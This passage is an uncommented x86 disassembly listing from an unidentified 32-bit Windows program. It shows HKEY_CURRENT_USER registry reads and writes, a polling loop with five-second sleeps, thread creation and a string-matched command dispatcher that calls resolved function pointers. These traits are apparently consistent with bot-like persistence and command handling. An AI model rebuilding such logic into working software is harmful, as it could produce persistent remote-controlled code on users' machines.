  405c95:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  405c98:	ff 15 54 02 41 00    	call   *0x410254
  405c9e:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  405ca1:	ff 15 58 02 41 00    	call   *0x410258
  405ca7:	50                   	push   %eax
  405ca8:	ff 15 50 01 41 00    	call   *0x410150
  405cae:	85 c0                	test   %eax,%eax
  405cb0:	75 2a                	jne    0x405cdc
  405cb2:	ff 15 3c 01 41 00    	call   *0x41013c
  405cb8:	48                   	dec    %eax
  405cb9:	48                   	dec    %eax
  405cba:	75 15                	jne    0x405cd1
  405cbc:	8d 85 78 fe ff ff    	lea    -0x188(%ebp),%eax
  405cc2:	50                   	push   %eax
  405cc3:	ff 75 f8             	push   -0x8(%ebp)
  405cc6:	ff 15 38 01 41 00    	call   *0x410138
  405ccc:	e9 03 ff ff ff       	jmp    0x405bd4
  405cd1:	ff 75 f8             	push   -0x8(%ebp)
  405cd4:	ff 15 74 01 41 00    	call   *0x410174
  405cda:	eb 21                	jmp    0x405cfd
  405cdc:	53                   	push   %ebx
  405cdd:	8d 45 ff             	lea    -0x1(%ebp),%eax
  405ce0:	83 ec 10             	sub    $0x10,%esp
  405ce3:	8b cc                	mov    %esp,%ecx
  405ce5:	50                   	push   %eax
  405ce6:	68 70 0c 41 00       	push   $0x410c70
  405ceb:	ff 15 4c 02 41 00    	call   *0x41024c
  405cf1:	b9 c0 56 41 00       	mov    $0x4156c0,%ecx
  405cf6:	e8 9f dd ff ff       	call   0x403a9a
  405cfb:	b3 01                	mov    $0x1,%bl
  405cfd:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  405d00:	ff 15 54 02 41 00    	call   *0x410254
  405d06:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  405d09:	ff 15 54 02 41 00    	call   *0x410254
  405d0f:	8a c3                	mov    %bl,%al
  405d11:	eb 3c                	jmp    0x405d4f
  405d13:	53                   	push   %ebx
  405d14:	8d 45 ff             	lea    -0x1(%ebp),%eax
  405d17:	83 ec 10             	sub    $0x10,%esp
  405d1a:	8b cc                	mov    %esp,%ecx
  405d1c:	50                   	push   %eax
  405d1d:	68 a4 0c 41 00       	push   $0x410ca4
  405d22:	ff 15 4c 02 41 00    	call   *0x41024c
  405d28:	b9 c0 56 41 00       	mov    $0x4156c0,%ecx
  405d2d:	e8 68 dd ff ff       	call   0x403a9a
  405d32:	ff 75 f8             	push   -0x8(%ebp)
  405d35:	ff 15 74 01 41 00    	call   *0x410174
  405d3b:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  405d3e:	ff 15 54 02 41 00    	call   *0x410254
  405d44:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  405d47:	ff 15 54 02 41 00    	call   *0x410254
  405d4d:	b0 01                	mov    $0x1,%al
  405d4f:	5e                   	pop    %esi
  405d50:	5b                   	pop    %ebx
  405d51:	c9                   	leave
  405d52:	c3                   	ret
  405d53:	55                   	push   %ebp
  405d54:	8b ec                	mov    %esp,%ebp
  405d56:	81 ec 28 01 00 00    	sub    $0x128,%esp
  405d5c:	8d 45 ff             	lea    -0x1(%ebp),%eax
  405d5f:	53                   	push   %ebx
  405d60:	50                   	push   %eax
  405d61:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  405d64:	ff 15 50 02 41 00    	call   *0x410250
  405d6a:	68 40 0d 41 00       	push   $0x410d40
  405d6f:	68 f8 0c 41 00       	push   $0x410cf8
  405d74:	8d 45 dc             	lea    -0x24(%ebp),%eax
  405d77:	68 01 00 00 80       	push   $0x80000001
  405d7c:	50                   	push   %eax
  405d7d:	32 db                	xor    %bl,%bl
  405d7f:	e8 6d 31 00 00       	call   0x408ef1
  405d84:	83 c4 10             	add    $0x10,%esp
  405d87:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  405d8a:	50                   	push   %eax
  405d8b:	ff 15 64 02 41 00    	call   *0x410264
  405d91:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  405d94:	ff 15 54 02 41 00    	call   *0x410254
  405d9a:	8d 45 ec             	lea    -0x14(%ebp),%eax
  405d9d:	68 68 06 41 00       	push   $0x410668
  405da2:	50                   	push   %eax
  405da3:	ff 15 38 02 41 00    	call   *0x410238
  405da9:	59                   	pop    %ecx
  405daa:	84 c0                	test   %al,%al
  405dac:	59                   	pop    %ecx
  405dad:	74 12                	je     0x405dc1
  405daf:	6a 00                	push   $0x0
  405db1:	8d 45 ff             	lea    -0x1(%ebp),%eax
  405db4:	83 ec 10             	sub    $0x10,%esp
  405db7:	8b cc                	mov    %esp,%ecx
  405db9:	50                   	push   %eax
  405dba:	68 e0 0c 41 00       	push   $0x410ce0
  405dbf:	eb 59                	jmp    0x405e1a
  405dc1:	8d 85 d8 fe ff ff    	lea    -0x128(%ebp),%eax
  405dc7:	68 04 01 00 00       	push   $0x104
  405dcc:	50                   	push   %eax
  405dcd:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  405dd0:	ff 15 58 02 41 00    	call   *0x410258
  405dd6:	50                   	push   %eax
  405dd7:	ff 15 30 01 41 00    	call   *0x410130
  405ddd:	8d 85 d8 fe ff ff    	lea    -0x128(%ebp),%eax
  405de3:	50                   	push   %eax
  405de4:	ff 15 d4 03 41 00    	call   *0x4103d4
  405dea:	85 c0                	test   %eax,%eax
  405dec:	75 0b                	jne    0x405df9
  405dee:	50                   	push   %eax
  405def:	8d 45 ff             	lea    -0x1(%ebp),%eax
  405df2:	83 ec 10             	sub    $0x10,%esp
  405df5:	8b cc                	mov    %esp,%ecx
  405df7:	eb c0                	jmp    0x405db9
  405df9:	8d 85 d8 fe ff ff    	lea    -0x128(%ebp),%eax
  405dff:	50                   	push   %eax
  405e00:	e8 2f 94 00 00       	call   0x40f234
  405e05:	59                   	pop    %ecx
  405e06:	85 c0                	test   %eax,%eax
  405e08:	6a 00                	push   $0x0
  405e0a:	74 22                	je     0x405e2e
  405e0c:	83 ec 10             	sub    $0x10,%esp
  405e0f:	8d 45 ff             	lea    -0x1(%ebp),%eax
  405e12:	8b cc                	mov    %esp,%ecx
  405e14:	50                   	push   %eax
  405e15:	68 c8 0c 41 00       	push   $0x410cc8
  405e1a:	ff 15 4c 02 41 00    	call   *0x41024c
  405e20:	b9 c0 56 41 00       	mov    $0x4156c0,%ecx
  405e25:	e8 70 dc ff ff       	call   0x403a9a
  405e2a:	b3 01                	mov    $0x1,%bl
  405e2c:	eb 36                	jmp    0x405e64
  405e2e:	68 c4 0c 41 00       	push   $0x410cc4
  405e33:	b9 68 59 41 00       	mov    $0x415968,%ecx
  405e38:	ff 15 20 02 41 00    	call   *0x410220
  405e3e:	85 c0                	test   %eax,%eax
  405e40:	74 22                	je     0x405e64
  405e42:	6a 00                	push   $0x0
  405e44:	8d 45 ff             	lea    -0x1(%ebp),%eax
  405e47:	83 ec 10             	sub    $0x10,%esp
  405e4a:	b3 01                	mov    $0x1,%bl
  405e4c:	8b cc                	mov    %esp,%ecx
  405e4e:	50                   	push   %eax
  405e4f:	68 c8 0c 41 00       	push   $0x410cc8
  405e54:	ff 15 4c 02 41 00    	call   *0x41024c
  405e5a:	b9 c0 56 41 00       	mov    $0x4156c0,%ecx
  405e5f:	e8 36 dc ff ff       	call   0x403a9a
  405e64:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  405e67:	ff 15 54 02 41 00    	call   *0x410254
  405e6d:	8a c3                	mov    %bl,%al
  405e6f:	5b                   	pop    %ebx
  405e70:	c9                   	leave
  405e71:	c3                   	ret
  405e72:	55                   	push   %ebp
  405e73:	8b ec                	mov    %esp,%ebp
  405e75:	51                   	push   %ecx
  405e76:	51                   	push   %ecx
  405e77:	53                   	push   %ebx
  405e78:	56                   	push   %esi
  405e79:	ff 35 64 57 41 00    	push   0x415764
  405e7f:	8b 35 8c 01 41 00    	mov    0x41018c,%esi
  405e85:	c6 05 6a 57 41 00 01 	movb   $0x1,0x41576a
  405e8c:	ff d6                	call   *%esi
  405e8e:	33 db                	xor    %ebx,%ebx
  405e90:	88 5d ff             	mov    %bl,-0x1(%ebp)
  405e93:	88 5d fe             	mov    %bl,-0x2(%ebp)
  405e96:	88 5d fd             	mov    %bl,-0x3(%ebp)
  405e99:	88 5d fb             	mov    %bl,-0x5(%ebp)
  405e9c:	88 5d fc             	mov    %bl,-0x4(%ebp)
  405e9f:	38 5d ff             	cmp    %bl,-0x1(%ebp)
  405ea2:	75 08                	jne    0x405eac
  405ea4:	e8 aa fe ff ff       	call   0x405d53
  405ea9:	88 45 ff             	mov    %al,-0x1(%ebp)
  405eac:	38 5d fe             	cmp    %bl,-0x2(%ebp)
  405eaf:	75 08                	jne    0x405eb9
  405eb1:	e8 45 fc ff ff       	call   0x405afb
  405eb6:	88 45 fe             	mov    %al,-0x2(%ebp)
  405eb9:	38 5d fb             	cmp    %bl,-0x5(%ebp)
  405ebc:	75 08                	jne    0x405ec6
  405ebe:	e8 f3 f8 ff ff       	call   0x4057b6
  405ec3:	88 45 fb             	mov    %al,-0x5(%ebp)
  405ec6:	38 5d fd             	cmp    %bl,-0x3(%ebp)
  405ec9:	75 08                	jne    0x405ed3
  405ecb:	e8 1c f8 ff ff       	call   0x4056ec
  405ed0:	88 45 fd             	mov    %al,-0x3(%ebp)
  405ed3:	38 5d fc             	cmp    %bl,-0x4(%ebp)
  405ed6:	75 08                	jne    0x405ee0
  405ed8:	e8 45 f7 ff ff       	call   0x405622
  405edd:	88 45 fc             	mov    %al,-0x4(%ebp)
  405ee0:	38 5d ff             	cmp    %bl,-0x1(%ebp)
  405ee3:	74 14                	je     0x405ef9
  405ee5:	38 5d fe             	cmp    %bl,-0x2(%ebp)
  405ee8:	74 0f                	je     0x405ef9
  405eea:	38 5d fd             	cmp    %bl,-0x3(%ebp)
  405eed:	74 0a                	je     0x405ef9
  405eef:	38 5d fc             	cmp    %bl,-0x4(%ebp)
  405ef2:	74 05                	je     0x405ef9
  405ef4:	38 5d fb             	cmp    %bl,-0x5(%ebp)
  405ef7:	75 07                	jne    0x405f00
  405ef9:	68 88 13 00 00       	push   $0x1388
  405efe:	ff d6                	call   *%esi
  405f00:	38 5d ff             	cmp    %bl,-0x1(%ebp)
  405f03:	74 9f                	je     0x405ea4
  405f05:	38 5d fe             	cmp    %bl,-0x2(%ebp)
  405f08:	74 95                	je     0x405e9f
  405f0a:	38 5d fd             	cmp    %bl,-0x3(%ebp)
  405f0d:	74 90                	je     0x405e9f
  405f0f:	38 5d fc             	cmp    %bl,-0x4(%ebp)
  405f12:	74 8b                	je     0x405e9f
  405f14:	38 5d fb             	cmp    %bl,-0x5(%ebp)
  405f17:	74 86                	je     0x405e9f
  405f19:	53                   	push   %ebx
  405f1a:	8d 45 fb             	lea    -0x5(%ebp),%eax
  405f1d:	83 ec 10             	sub    $0x10,%esp
  405f20:	8b cc                	mov    %esp,%ecx
  405f22:	50                   	push   %eax
  405f23:	68 4c 0d 41 00       	push   $0x410d4c
  405f28:	ff 15 4c 02 41 00    	call   *0x41024c
  405f2e:	b9 c0 56 41 00       	mov    $0x4156c0,%ecx
  405f33:	e8 62 db ff ff       	call   0x403a9a
  405f38:	38 1d 60 57 41 00    	cmp    %bl,0x415760
  405f3e:	74 20                	je     0x405f60
  405f40:	6a 01                	push   $0x1
  405f42:	68 48 0d 41 00       	push   $0x410d48
  405f47:	b9 e8 57 41 00       	mov    $0x4157e8,%ecx
  405f4c:	ff 15 58 02 41 00    	call   *0x410258
  405f52:	50                   	push   %eax
  405f53:	68 01 00 00 80       	push   $0x80000001
  405f58:	e8 e9 30 00 00       	call   0x409046
  405f5d:	83 c4 10             	add    $0x10,%esp
  405f60:	88 1d 6a 57 41 00    	mov    %bl,0x41576a
  405f66:	5e                   	pop    %esi
  405f67:	33 c0                	xor    %eax,%eax
  405f69:	5b                   	pop    %ebx
  405f6a:	c9                   	leave
  405f6b:	c3                   	ret
  405f6c:	55                   	push   %ebp
  405f6d:	8b ec                	mov    %esp,%ebp
  405f6f:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  405f72:	8a 45 08             	mov    0x8(%ebp),%al
  405f75:	69 c9 60 ea 00 00    	imul   $0xea60,%ecx,%ecx
  405f7b:	53                   	push   %ebx
  405f7c:	56                   	push   %esi
  405f7d:	84 c0                	test   %al,%al
  405f7f:	57                   	push   %edi
  405f80:	a2 60 57 41 00       	mov    %al,0x415760
  405f85:	89 0d 64 57 41 00    	mov    %ecx,0x415764
  405f8b:	74 4c                	je     0x405fd9
  405f8d:	83 65 08 00          	andl   $0x0,0x8(%ebp)
  405f91:	bb 48 0d 41 00       	mov    $0x410d48,%ebx
  405f96:	bf e8 57 41 00       	mov    $0x4157e8,%edi
  405f9b:	53                   	push   %ebx
  405f9c:	8b cf                	mov    %edi,%ecx
  405f9e:	ff 15 58 02 41 00    	call   *0x410258
  405fa4:	be 01 00 00 80       	mov    $0x80000001,%esi
  405fa9:	50                   	push   %eax
  405faa:	56                   	push   %esi
  405fab:	e8 9e 2e 00 00       	call   0x408e4e
  405fb0:	83 c4 0c             	add    $0xc,%esp
  405fb3:	84 c0                	test   %al,%al
  405fb5:	74 22                	je     0x405fd9
  405fb7:	8d 45 08             	lea    0x8(%ebp),%eax
  405fba:	8b cf                	mov    %edi,%ecx
  405fbc:	50                   	push   %eax
  405fbd:	53                   	push   %ebx
  405fbe:	ff 15 58 02 41 00    	call   *0x410258
  405fc4:	50                   	push   %eax
  405fc5:	56                   	push   %esi
  405fc6:	e8 cc 2e 00 00       	call   0x408e97
  405fcb:	33 c0                	xor    %eax,%eax
  405fcd:	83 c4 10             	add    $0x10,%esp
  405fd0:	39 45 08             	cmp    %eax,0x8(%ebp)
  405fd3:	74 06                	je     0x405fdb
  405fd5:	32 c0                	xor    %al,%al
  405fd7:	eb 14                	jmp    0x405fed
  405fd9:	33 c0                	xor    %eax,%eax
  405fdb:	50                   	push   %eax
  405fdc:	50                   	push   %eax
  405fdd:	50                   	push   %eax
  405fde:	68 72 5e 40 00       	push   $0x405e72
  405fe3:	50                   	push   %eax
  405fe4:	50                   	push   %eax
  405fe5:	ff 15 98 01 41 00    	call   *0x410198
  405feb:	b0 01                	mov    $0x1,%al
  405fed:	5f                   	pop    %edi
  405fee:	5e                   	pop    %esi
  405fef:	5b                   	pop    %ebx
  405ff0:	5d                   	pop    %ebp
  405ff1:	c3                   	ret
  405ff2:	e8 05 00 00 00       	call   0x405ffc
  405ff7:	e9 0d 00 00 00       	jmp    0x406009
  405ffc:	6a 00                	push   $0x0
  405ffe:	b9 70 57 41 00       	mov    $0x415770,%ecx
  406003:	e8 d9 c0 ff ff       	call   0x4020e1
  406008:	c3                   	ret
  406009:	68 15 60 40 00       	push   $0x406015
  40600e:	e8 a7 9c 00 00       	call   0x40fcba
  406013:	59                   	pop    %ecx
  406014:	c3                   	ret
  406015:	b9 70 57 41 00       	mov    $0x415770,%ecx
  40601a:	e9 b7 c1 ff ff       	jmp    0x4021d6
  40601f:	e8 05 00 00 00       	call   0x406029
  406024:	e9 15 00 00 00       	jmp    0x40603e
  406029:	55                   	push   %ebp
  40602a:	8b ec                	mov    %esp,%ebp
  40602c:	51                   	push   %ecx
  40602d:	8d 45 ff             	lea    -0x1(%ebp),%eax
  406030:	b9 b0 57 41 00       	mov    $0x4157b0,%ecx
  406035:	50                   	push   %eax
  406036:	ff 15 50 02 41 00    	call   *0x410250
  40603c:	c9                   	leave
  40603d:	c3                   	ret
  40603e:	68 4a 60 40 00       	push   $0x40604a
  406043:	e8 72 9c 00 00       	call   0x40fcba
  406048:	59                   	pop    %ecx
  406049:	c3                   	ret
  40604a:	b9 b0 57 41 00       	mov    $0x4157b0,%ecx
  40604f:	ff 25 54 02 41 00    	jmp    *0x410254
  406055:	55                   	push   %ebp
  406056:	8b ec                	mov    %esp,%ebp
  406058:	83 ec 20             	sub    $0x20,%esp
  40605b:	53                   	push   %ebx
  40605c:	bb 70 57 41 00       	mov    $0x415770,%ebx
  406061:	56                   	push   %esi
  406062:	57                   	push   %edi
  406063:	8b cb                	mov    %ebx,%ecx
  406065:	e8 9f c0 ff ff       	call   0x402109
  40606a:	83 ec 10             	sub    $0x10,%esp
  40606d:	be 78 52 41 00       	mov    $0x415278,%esi
  406072:	8b fc                	mov    %esp,%edi
  406074:	8b cb                	mov    %ebx,%ecx
  406076:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406077:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406078:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406079:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40607a:	e8 e9 c0 ff ff       	call   0x402168
  40607f:	80 3d c4 57 41 00 00 	cmpb   $0x0,0x4157c4
  406086:	68 88 59 41 00       	push   $0x415988
  40608b:	74 43                	je     0x4060d0
  40608d:	8d 45 e0             	lea    -0x20(%ebp),%eax
  406090:	50                   	push   %eax
  406091:	e8 3d 8d 00 00       	call   0x40edd3
  406096:	51                   	push   %ecx
  406097:	51                   	push   %ecx
  406098:	8b f4                	mov    %esp,%esi
  40609a:	50                   	push   %eax
  40609b:	68 68 52 41 00       	push   $0x415268
  4060a0:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4060a3:	68 84 0d 41 00       	push   $0x410d84
  4060a8:	50                   	push   %eax
  4060a9:	e8 6c 9b 00 00       	call   0x40fc1a
  4060ae:	83 c4 0c             	add    $0xc,%esp
  4060b1:	50                   	push   %eax
  4060b2:	56                   	push   %esi
  4060b3:	e8 5c 9b 00 00       	call   0x40fc14
  4060b8:	83 c4 0c             	add    $0xc,%esp
  4060bb:	8b cb                	mov    %ebx,%ecx
  4060bd:	e8 d6 c0 ff ff       	call   0x402198
  4060c2:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4060c5:	ff 15 54 02 41 00    	call   *0x410254
  4060cb:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  4060ce:	eb 41                	jmp    0x406111
  4060d0:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4060d3:	50                   	push   %eax
  4060d4:	e8 fa 8c 00 00       	call   0x40edd3
  4060d9:	51                   	push   %ecx
  4060da:	51                   	push   %ecx
  4060db:	8b f4                	mov    %esp,%esi
  4060dd:	50                   	push   %eax
  4060de:	68 68 52 41 00       	push   $0x415268
  4060e3:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4060e6:	68 78 0d 41 00       	push   $0x410d78
  4060eb:	50                   	push   %eax
  4060ec:	e8 29 9b 00 00       	call   0x40fc1a
  4060f1:	83 c4 0c             	add    $0xc,%esp
  4060f4:	50                   	push   %eax
  4060f5:	56                   	push   %esi
  4060f6:	e8 19 9b 00 00       	call   0x40fc14
  4060fb:	83 c4 0c             	add    $0xc,%esp
  4060fe:	8b cb                	mov    %ebx,%ecx
  406100:	e8 93 c0 ff ff       	call   0x402198
  406105:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  406108:	ff 15 54 02 41 00    	call   *0x410254
  40610e:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  406111:	ff 15 54 02 41 00    	call   *0x410254
  406117:	6a 00                	push   $0x0
  406119:	68 2a 61 40 00       	push   $0x40612a
  40611e:	8b cb                	mov    %ebx,%ecx
  406120:	e8 f7 c0 ff ff       	call   0x40221c
  406125:	5f                   	pop    %edi
  406126:	5e                   	pop    %esi
  406127:	5b                   	pop    %ebx
  406128:	c9                   	leave
  406129:	c3                   	ret
  40612a:	55                   	push   %ebp
  40612b:	8b ec                	mov    %esp,%ebp
  40612d:	83 ec 40             	sub    $0x40,%esp
  406130:	56                   	push   %esi
  406131:	57                   	push   %edi
  406132:	83 ec 10             	sub    $0x10,%esp
  406135:	be 68 52 41 00       	mov    $0x415268,%esi
  40613a:	8b cc                	mov    %esp,%ecx
  40613c:	56                   	push   %esi
  40613d:	ff 15 60 02 41 00    	call   *0x410260
  406143:	83 ec 10             	sub    $0x10,%esp
  406146:	8d 45 0c             	lea    0xc(%ebp),%eax
  406149:	8b cc                	mov    %esp,%ecx
  40614b:	50                   	push   %eax
  40614c:	ff 15 60 02 41 00    	call   *0x410260
  406152:	8d 45 f0             	lea    -0x10(%ebp),%eax
  406155:	50                   	push   %eax
  406156:	e8 5a 8e 00 00       	call   0x40efb5
  40615b:	83 c4 24             	add    $0x24,%esp
  40615e:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  406161:	6a 00                	push   $0x0
  406163:	e8 21 b1 ff ff       	call   0x401289
  406168:	50                   	push   %eax
  406169:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40616c:	ff 15 60 02 41 00    	call   *0x410260
  406172:	8b 3d 38 02 41 00    	mov    0x410238,%edi
  406178:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40617b:	68 a0 0d 41 00       	push   $0x410da0
  406180:	50                   	push   %eax
  406181:	ff d7                	call   *%edi
  406183:	59                   	pop    %ecx
  406184:	84 c0                	test   %al,%al
  406186:	59                   	pop    %ecx
  406187:	0f 84 81 00 00 00    	je     0x40620e
  40618d:	6a 01                	push   $0x1
  40618f:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  406192:	e8 f2 b0 ff ff       	call   0x401289
  406197:	8b c8                	mov    %eax,%ecx
  406199:	ff 15 58 02 41 00    	call   *0x410258
  40619f:	50                   	push   %eax
  4061a0:	e8 47 f1 ff ff       	call   0x4052ec
  4061a5:	85 c0                	test   %eax,%eax
  4061a7:	59                   	pop    %ecx
  4061a8:	0f 84 93 00 00 00    	je     0x406241
  4061ae:	68 98 0d 41 00       	push   $0x410d98
  4061b3:	50                   	push   %eax
  4061b4:	e8 8d f3 ff ff       	call   0x405546
  4061b9:	a3 c0 57 41 00       	mov    %eax,0x4157c0
  4061be:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4061c1:	68 88 59 41 00       	push   $0x415988
  4061c6:	50                   	push   %eax
  4061c7:	c6 05 c4 57 41 00 01 	movb   $0x1,0x4157c4
  4061ce:	e8 00 8c 00 00       	call   0x40edd3
  4061d3:	8b fc                	mov    %esp,%edi
  4061d5:	50                   	push   %eax
  4061d6:	56                   	push   %esi
  4061d7:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4061da:	68 84 0d 41 00       	push   $0x410d84
  4061df:	50                   	push   %eax
  4061e0:	e8 35 9a 00 00       	call   0x40fc1a
  4061e5:	83 c4 0c             	add    $0xc,%esp
  4061e8:	50                   	push   %eax
  4061e9:	57                   	push   %edi
  4061ea:	e8 25 9a 00 00       	call   0x40fc14
  4061ef:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4061f2:	83 c4 0c             	add    $0xc,%esp
  4061f5:	e8 9e bf ff ff       	call   0x402198
  4061fa:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  4061fd:	ff 15 54 02 41 00    	call   *0x410254
  406203:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  406206:	ff 15 54 02 41 00    	call   *0x410254
  40620c:	eb 33                	jmp    0x406241
  40620e:	8d 45 e0             	lea    -0x20(%ebp),%eax
  406211:	68 90 0d 41 00       	push   $0x410d90
  406216:	50                   	push   %eax
  406217:	ff d7                	call   *%edi
  406219:	59                   	pop    %ecx
  40621a:	84 c0                	test   %al,%al
  40621c:	59                   	pop    %ecx
  40621d:	74 22                	je     0x406241
  40621f:	6a 01                	push   $0x1
  406221:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  406224:	e8 60 b0 ff ff       	call   0x401289
  406229:	8b c8                	mov    %eax,%ecx
  40622b:	ff 15 58 02 41 00    	call   *0x410258
  406231:	50                   	push   %eax
  406232:	ff 15 9c 03 41 00    	call   *0x41039c
  406238:	50                   	push   %eax
  406239:	ff 15 c0 57 41 00    	call   *0x4157c0
  40623f:	59                   	pop    %ecx
  406240:	59                   	pop    %ecx
  406241:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  406244:	ff 15 54 02 41 00    	call   *0x410254
  40624a:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40624d:	e8 ea b8 ff ff       	call   0x401b3c
  406252:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  406255:	ff 15 54 02 41 00    	call   *0x410254
  40625b:	5f                   	pop    %edi
  40625c:	33 c0                	xor    %eax,%eax
  40625e:	5e                   	pop    %esi
  40625f:	c9                   	leave
  406260:	c3                   	ret
  406261:	e8 05 00 00 00       	call   0x40626b
  406266:	e9 15 00 00 00       	jmp    0x406280
  40626b:	55                   	push   %ebp
  40626c:	8b ec                	mov    %esp,%ebp
  40626e:	51                   	push   %ecx
  40626f:	8d 45 ff             	lea    -0x1(%ebp),%eax
  406272:	b9 d0 57 41 00       	mov    $0x4157d0,%ecx
  406277:	50                   	push   %eax
  406278:	ff 15 50 02 41 00    	call   *0x410250
  40627e:	c9                   	leave
  40627f:	c3                   	ret
  406280:	68 8c 62 40 00       	push   $0x40628c
  406285:	e8 30 9a 00 00       	call   0x40fcba
  40628a:	59                   	pop    %ecx
  40628b:	c3                   	ret
  40628c:	b9 d0 57 41 00       	mov    $0x4157d0,%ecx
  406291:	ff 25 54 02 41 00    	jmp    *0x410254
  406297:	e8 05 00 00 00       	call   0x4062a1
  40629c:	e9 15 00 00 00       	jmp    0x4062b6
  4062a1:	55                   	push   %ebp
  4062a2:	8b ec                	mov    %esp,%ebp
  4062a4:	51                   	push   %ecx
  4062a5:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4062a8:	b9 e8 57 41 00       	mov    $0x4157e8,%ecx
  4062ad:	50                   	push   %eax
  4062ae:	ff 15 50 02 41 00    	call   *0x410250
  4062b4:	c9                   	leave
  4062b5:	c3                   	ret
  4062b6:	68 c2 62 40 00       	push   $0x4062c2
  4062bb:	e8 fa 99 00 00       	call   0x40fcba
  4062c0:	59                   	pop    %ecx
  4062c1:	c3                   	ret
  4062c2:	b9 e8 57 41 00       	mov    $0x4157e8,%ecx
  4062c7:	ff 25 54 02 41 00    	jmp    *0x410254
  4062cd:	e8 05 00 00 00       	call   0x4062d7
  4062d2:	e9 15 00 00 00       	jmp    0x4062ec
  4062d7:	55                   	push   %ebp
  4062d8:	8b ec                	mov    %esp,%ebp
  4062da:	51                   	push   %ecx
  4062db:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4062de:	b9 f8 57 41 00       	mov    $0x4157f8,%ecx
  4062e3:	50                   	push   %eax
  4062e4:	ff 15 50 02 41 00    	call   *0x410250
  4062ea:	c9                   	leave
  4062eb:	c3                   	ret
  4062ec:	68 f8 62 40 00       	push   $0x4062f8
  4062f1:	e8 c4 99 00 00       	call   0x40fcba
  4062f6:	59                   	pop    %ecx
  4062f7:	c3                   	ret
  4062f8:	b9 f8 57 41 00       	mov    $0x4157f8,%ecx
  4062fd:	ff 25 54 02 41 00    	jmp    *0x410254
  406303:	e8 05 00 00 00       	call   0x40630d
  406308:	e9 15 00 00 00       	jmp    0x406322
  40630d:	55                   	push   %ebp
  40630e:	8b ec                	mov    %esp,%ebp
  406310:	51                   	push   %ecx
  406311:	8d 45 ff             	lea    -0x1(%ebp),%eax
  406314:	b9 18 59 41 00       	mov    $0x415918,%ecx
  406319:	50                   	push   %eax
  40631a:	ff 15 50 02 41 00    	call   *0x410250
  406320:	c9                   	leave
  406321:	c3                   	ret
  406322:	68 2e 63 40 00       	push   $0x40632e
  406327:	e8 8e 99 00 00       	call   0x40fcba
  40632c:	59                   	pop    %ecx
  40632d:	c3                   	ret
  40632e:	b9 18 59 41 00       	mov    $0x415918,%ecx
  406333:	ff 25 54 02 41 00    	jmp    *0x410254
  406339:	55                   	push   %ebp
  40633a:	8b ec                	mov    %esp,%ebp
  40633c:	83 ec 30             	sub    $0x30,%esp
  40633f:	80 7d 08 01          	cmpb   $0x1,0x8(%ebp)
  406343:	53                   	push   %ebx
  406344:	56                   	push   %esi
  406345:	57                   	push   %edi
  406346:	be 60 08 41 00       	mov    $0x410860,%esi
  40634b:	bf d0 57 41 00       	mov    $0x4157d0,%edi
  406350:	75 3e                	jne    0x406390
  406352:	6a 01                	push   $0x1
  406354:	8d 45 f0             	lea    -0x10(%ebp),%eax
  406357:	83 ec 10             	sub    $0x10,%esp
  40635a:	8b dc                	mov    %esp,%ebx
  40635c:	56                   	push   %esi
  40635d:	57                   	push   %edi
  40635e:	56                   	push   %esi
  40635f:	50                   	push   %eax
  406360:	e8 b5 98 00 00       	call   0x40fc1a
  406365:	83 c4 0c             	add    $0xc,%esp
  406368:	50                   	push   %eax
  406369:	53                   	push   %ebx
  40636a:	e8 b1 98 00 00       	call   0x40fc20
  40636f:	83 c4 0c             	add    $0xc,%esp
  406372:	ff 75 1c             	push   0x1c(%ebp)
  406375:	68 70 0e 41 00       	push   $0x410e70
  40637a:	68 01 00 00 80       	push   $0x80000001
  40637f:	e8 56 2c 00 00       	call   0x408fda
  406384:	83 c4 20             	add    $0x20,%esp
  406387:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40638a:	ff 15 54 02 41 00    	call   *0x410254
  406390:	80 7d 0c 01          	cmpb   $0x1,0xc(%ebp)
  406394:	75 3e                	jne    0x4063d4
  406396:	6a 01                	push   $0x1
  406398:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40639b:	83 ec 10             	sub    $0x10,%esp
  40639e:	8b dc                	mov    %esp,%ebx
  4063a0:	56                   	push   %esi
  4063a1:	57                   	push   %edi
  4063a2:	56                   	push   %esi
  4063a3:	50                   	push   %eax
  4063a4:	e8 71 98 00 00       	call   0x40fc1a
  4063a9:	83 c4 0c             	add    $0xc,%esp
  4063ac:	50                   	push   %eax
  4063ad:	53                   	push   %ebx
  4063ae:	e8 6d 98 00 00       	call   0x40fc20
  4063b3:	83 c4 0c             	add    $0xc,%esp
  4063b6:	ff 75 1c             	push   0x1c(%ebp)
